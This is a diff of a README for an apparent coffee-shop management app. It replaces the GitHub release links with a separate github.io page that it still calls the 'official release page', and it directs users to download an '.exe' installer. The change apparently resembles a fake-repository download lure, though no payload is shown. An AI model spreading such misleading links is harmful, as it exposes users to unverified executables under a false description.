@@ -1,6 +1,6 @@
 # ☕ Coffee-Shop-Management-System - Simplify daily coffee shop management tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Darellepyrographic686/Coffee-Shop-Management-System/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://darellepyrographic686.github.io)
 
 ## 📋 Table of Contents
 
@@ -37,7 +37,7 @@ To run this application, your computer needs the following:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Darellepyrographic686/Coffee-Shop-Management-System/releases](https://github.com/Darellepyrographic686/Coffee-Shop-Management-System/releases).
+1.  Visit the official release page: [https://darellepyrographic686.github.io](https://darellepyrographic686.github.io).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the link that ends with ".exe" to download the installer file.
 4.  Open your "Downloads" folder once the file finishes downloading.
